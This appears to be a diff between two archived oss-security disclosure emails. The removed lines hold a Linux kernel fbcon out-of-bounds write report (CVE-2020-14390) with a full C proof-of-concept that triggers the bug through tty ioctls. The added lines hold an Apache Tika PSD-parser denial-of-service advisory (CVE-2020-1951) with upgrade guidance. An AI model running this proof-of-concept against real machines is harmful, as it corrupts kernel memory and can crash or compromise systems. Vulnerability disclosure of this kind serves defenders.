@@ -1,51 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/15/2
-Message-ID: <CAH5WSp7F86OfgeOLROT7bGwH1jkTivrHp6KOsEnsHDaEq166AQ@mail.gmail.com>
-Date: Tue, 15 Sep 2020 18:23:20 +0800
-From: Minh Yuan <yuanmingbuaa@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2020-14390: Linux kernel: slab-out-of-bounds in fbcon
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/03/18/4
+Message-ID: <CAC1dCwU+88efiYG75neuPT3yaNEzWFjZxSoLEnV9PfB5yTyK4w@mail.gmail.com>
+Date: Wed, 18 Mar 2020 12:03:23 -0400
+From: Tim Allison <tallison@...che.org>
+To: "<dev@...a.apache.org>" <dev@...a.apache.org>, user@...a.apache.org, announce@...che.org,  Apache Security Team <security@...che.org>, oss-security@...ts.openwall.com
+Subject: [CVE-2020-1951] Infinite Loop (DoS) vulnerability in Apache Tika's PSDParser
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+TItle: [CVE-2020-1951] Infinite Loop (DoS) vulnerability in Apache Tika's
+PSDParser
 
-I found a out-of-bound write in fbcon_redraw_softback while the kernel
-version <= 5.9.rc5. The oldest affected kernel version is 2.2.3.
-The root cause of this vulnerability is that the value of vc->vc_origin is
-not updated in time while invoking vc_do_resize.
+Severity: Medium
 
-This is my PoC (need the permission to open and write the tty, and need to
-have a fbcon driver):
+Vendor: The Apache Software Foundation
 
-// author by ziiiro@thu
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
+Versions Affected: Apache Tika  1.0 to 1.23
+
+Description:
+A carefully crafted or corrupt PSD file can cause an infinite loop in Apache
+Tika's PSDParser in versions 1.0-1.23.
 
 
-int main(int argc, char** argv)
-{
-        int fd = open("/dev/tty1", O_RDWR, 0);
-        unsigned short size1[3] = {3, 0x21, 0};
-        ioctl(fd, 0x5609, size1); // VT_RESIZE
-        for (int i = 0; i < 30; i++) {
-            write(fd, "\x0a", 1);
-        }
+Mitigation:
+Apache Tika users should upgrade to 1.24 or later.
 
-        signed int args[3] = {13, -5, 0};
-        ioctl(fd, 0x541c, args); // TIOCLINUX
-        unsigned short size2[3] = {3, 0x39, 0};
-        ioctl(fd, 0x5609, size2); // VT_RESIZE
-}
-
-
-This is the commit to patch the issue:
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=50145474f6ef4a9c19205b173da6264a644c7489
-
-Thanks,
-Yuan Ming, Tsinghua University
+Credit:
+This issue was discovered by Tim Allison on the Apache Tika team.
 
